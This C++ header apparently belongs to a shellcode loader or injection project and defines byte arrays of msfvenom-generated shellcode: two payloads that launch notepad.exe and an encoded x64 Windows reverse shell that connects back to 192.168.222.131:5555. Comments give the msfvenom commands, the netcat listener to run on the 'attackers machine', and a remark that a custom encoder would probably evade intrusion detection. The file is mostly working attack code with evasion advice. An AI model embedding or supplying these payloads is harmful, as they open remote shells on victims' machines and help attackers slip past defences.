#pragma once

class Payloads
{
public:
	static const unsigned char* Create() // tbd
	{
#ifdef _X86_
		return x86_notepad;
#else
		return x64_notepad;
#endif
	}

	// msfvenom - p windows/exec cmd=notepad.exe -a x86 --platform win -f c
	static constexpr unsigned char x86_notepad[] =
		"\xfc\xe8\x82\x00\x00\x00\x60\x89\xe5\x31\xc0\x64\x8b\x50"
		"\x30\x8b\x52\x0c\x8b\x52\x14\x8b\x72\x28\x0f\xb7\x4a\x26"
		"\x31\xff\xac\x3c\x61\x7c\x02\x2c\x20\xc1\xcf\x0d\x01\xc7"
		"\xe2\xf2\x52\x57\x8b\x52\x10\x8b\x4a\x3c\x8b\x4c\x11\x78"
		"\xe3\x48\x01\xd1\x51\x8b\x59\x20\x01\xd3\x8b\x49\x18\xe3"
		"\x3a\x49\x8b\x34\x8b\x01\xd6\x31\xff\xac\xc1\xcf\x0d\x01"
		"\xc7\x38\xe0\x75\xf6\x03\x7d\xf8\x3b\x7d\x24\x75\xe4\x58"
		"\x8b\x58\x24\x01\xd3\x66\x8b\x0c\x4b\x8b\x58\x1c\x01\xd3"
		"\x8b\x04\x8b\x01\xd0\x89\x44\x24\x24\x5b\x5b\x61\x59\x5a"
		"\x51\xff\xe0\x5f\x5f\x5a\x8b\x12\xeb\x8d\x5d\x6a\x01\x8d"
		"\x85\xb2\x00\x00\x00\x50\x68\x31\x8b\x6f\x87\xff\xd5\xbb"
		"\xf0\xb5\xa2\x56\x68\xa6\x95\xbd\x9d\xff\xd5\x3c\x06\x7c"
		"\x0a\x80\xfb\xe0\x75\x05\xbb\x47\x13\x72\x6f\x6a\x00\x53"
		"\xff\xd5\x6e\x6f\x74\x65\x70\x61\x64\x2e\x65\x78\x65\x00";

	// msfvenom -p windows/x64/exec cmd=notepad.exe -a x64 --platform win -f c -e x64/zutto_dekiru 
	static constexpr unsigned char x64_notepad[] =
		"\x48\x31\xff\x54\xda\xc3\x40\xb7\x23\x41\x5c\x48\xbd\x1e"
		"\x54\x39\xe1\xc0\xbc\x84\xe1\x66\x41\x81\xe4\x40\xf6\x49"
		"\x0f\xae\x04\x24\x4d\x8b\x4c\x24\x08\x48\xff\xcf\x49\x31"
		"\x6c\xf9\x2e\x48\x85\xff\x75\xf3\xe2\x1c\xba\x05\x30\x54"
		"\x44\xe1\x1e\x54\x78\xb0\x81\xec\xd6\xb0\x48\x1c\x08\x33"
		"\xa5\xf4\x0f\xb3\x7e\x1c\xb2\xb3\xd8\xf4\x0f\xb3\x3e\x1c"
		"\xb2\x93\x90\xf4\x8b\x56\x54\x1e\x74\xd0\x09\xf4\xb5\x21"
		"\xb2\x68\x58\x9d\xc2\x90\xa4\xa0\xdf\x9d\x34\xa0\xc1\x7d"
		"\x66\x0c\x4c\x15\x68\xa9\x4b\xee\xa4\x6a\x5c\x68\x71\xe0"
		"\x10\x37\x04\x69\x1e\x54\x39\xa9\x45\x7c\xf0\x86\x56\x55"
		"\xe9\xb1\x4b\xf4\x9c\xa5\x95\x14\x19\xa8\xc1\x6c\x67\xb7"
		"\x56\xab\xf0\xa0\x4b\x88\x0c\xa9\x1f\x82\x74\xd0\x09\xf4"
		"\xb5\x21\xb2\x15\xf8\x28\xcd\xfd\x85\x20\x26\xb4\x4c\x10"
		"\x8c\xbf\xc8\xc5\x16\x11\x00\x30\xb5\x64\xdc\xa5\x95\x14"
		"\x1d\xa8\xc1\x6c\xe2\xa0\x95\x58\x71\xa5\x4b\xfc\x98\xa8"
		"\x1f\x84\x78\x6a\xc4\x34\xcc\xe0\xce\x15\x61\xa0\x98\xe2"
		"\xdd\xbb\x5f\x0c\x78\xb8\x81\xe6\xcc\x62\xf2\x74\x78\xb3"
		"\x3f\x5c\xdc\xa0\x47\x0e\x71\x6a\xd2\x55\xd3\x1e\xe1\xab"
		"\x64\xa9\x7a\xbd\x84\xe1\x1e\x54\x39\xe1\xc0\xf4\x09\x6c"
		"\x1f\x55\x39\xe1\x81\x06\xb5\x6a\x71\xd3\xc6\x34\x7b\x4c"
		"\x31\x43\x48\x15\x83\x47\x55\x01\x19\x1e\xcb\x1c\xba\x25"
		"\xe8\x80\x82\x9d\x14\xd4\xc2\x01\xb5\xb9\x3f\xa6\x0d\x26"
		"\x56\x8b\xc0\xe5\xc5\x68\xc4\xab\xec\x8f\xaf\xc8\xe1\x91"
		"\x7f\x30\x17\x84\xb8\xd9\x84\x70";

	// msfvenom - p windows/shell_reverse_tcp LHOST=192.168.222.131 LPORT=5555 -f c -e x64/zutto_dekiru
	// allow connection on attackers machine 192.168.222.131 open port: nc -lvnp 5555
	// note: this payload exececution is often detected by IDS Network attack protection system (custom encoder would probably bypass it)
	static constexpr unsigned char x64_reverse_shell[] =
		"\x49\xba\xc1\x9c\x37\x5f\x0b\xca\x66\x2d\x48\x89\xe2\x4d"
		"\x31\xdb\x66\x81\xe2\xf0\xf8\xda\xcf\x48\x0f\xae\x02\x41"
		"\xb3\x3a\x48\x8b\x72\x08\x49\xff\xcb\x4e\x31\x54\xde\x1a"
		"\x4d\x85\xdb\x75\xf3\x3d\xd4\xb4\xbb\xfb\x22\xa6\x2d\xc1"
		"\x9c\x76\x0e\x4a\x9a\x34\x7c\x97\xd4\x06\x8d\x6e\x82\xed"
		"\x7f\xa1\xd4\xbc\x0d\x13\x82\xed\x7f\xe1\xd4\xbc\x2d\x5b"
		"\x82\x69\x9a\x8b\xd6\x7a\x6e\xc2\x82\x57\xed\x6d\xa0\x56"
		"\x23\x09\xe6\x46\x6c\x00\x55\x3a\x1e\x0a\x0b\x84\xc0\x93"
		"\xdd\x66\x17\x80\x98\x46\xa6\x83\xa0\x7f\x5e\xdb\x41\xe6"
		"\xa5\xc1\x9c\x37\x17\x8e\x0a\x12\x4a\x89\x9d\xe7\x0f\x80"
		"\x82\x7e\x69\x4a\xdc\x17\x16\x0a\x1a\x85\x7b\x89\x63\xfe"
		"\x1e\x80\xfe\xee\x65\xc0\x4a\x7a\x6e\xc2\x82\x57\xed\x6d"
		"\xdd\xf6\x96\x06\x8b\x67\xec\xf9\x7c\x42\xae\x47\xc9\x2a"
		"\x09\xc9\xd9\x0e\x8e\x7e\x12\x3e\x69\x4a\xdc\x13\x16\x0a"
		"\x1a\x00\x6c\x4a\x90\x7f\x1b\x80\x8a\x7a\x64\xc0\x4c\x76"
		"\xd4\x0f\x42\x2e\x2c\x11\xdd\x6f\x1e\x53\x94\x3f\x77\x80"
		"\xc4\x76\x06\x4a\x90\x2e\xae\x2d\xbc\x76\x0d\xf4\x2a\x3e"
		"\x6c\x98\xc6\x7f\xd4\x19\x23\x31\xd2\x3e\x63\x6a\x16\xb5"
		"\xbd\x15\x1f\x9e\xaf\x05\x5f\x0b\x8b\x30\x64\x48\x7a\x7f"
		"\xde\xe7\x6a\x67\x2d\xc1\xd5\xbe\xba\x42\x76\x64\x2d\xd4"
		"\x2f\xf7\xf7\xd5\x49\x27\x79\x88\x15\xd3\x13\x82\x3b\x27"
		"\x97\x8d\xeb\x11\x58\xf4\x1f\x2a\xa4\x2b\xf4\x36\x5e\x0b"
		"\xca\x3f\x6c\x7b\xb5\xb7\x34\x0b\x35\xb3\x7d\x91\xd1\x06"
		"\x96\x46\xfb\xa6\x65\x3e\x5c\x7f\xd6\xc9\x82\x99\xed\x89"
		"\x15\xf6\x1e\xb1\x20\x69\xf2\x21\x63\xe2\x17\x82\x0d\x0c"
		"\x3d\x80\xc4\x7b\xd6\xe9\x82\xef\xd4\x80\x26\xae\xfa\x7f"
		"\xab\x99\xf8\x89\x1d\xf3\x1f\x09\xca\x66\x64\x79\xff\x5a"
		"\x3b\x0b\xca\x66\x2d\xc1\xdd\x67\x1e\x5b\x82\xef\xcf\x96"
		"\xcb\x60\x12\x3a\x0a\x0c\x20\x98\xdd\x67\xbd\xf7\xac\xa1"
		"\x69\xe5\xc8\x36\x5e\x43\x47\x22\x09\xd9\x5a\x37\x37\x43"
		"\x43\x80\x7b\x91\xdd\x67\x1e\x5b\x8b\x36\x64\x3e\x5c\x76"
		"\x0f\x42\x35\xae\x60\x48\x5d\x7b\xd6\xca\x8b\xdc\x54\x0d"
		"\xa3\xb1\xa0\xde\x82\x57\xff\x89\x63\xfd\xd4\x05\x8b\xdc"
		"\x25\x46\x81\x57\xa0\xde\x71\x96\x98\x63\xca\x76\xe5\xad"
		"\x5f\xdb\xb0\x3e\x49\x7f\xdc\xcf\xe2\x5a\x2b\xbd\x96\xb7"
		"\xa4\xeb\xbf\x63\x96\x86\x8f\x45\x30\x61\xca\x3f\x6c\x48"
		"\x46\xc8\x8a\x94\x80\x59\xbb";
};
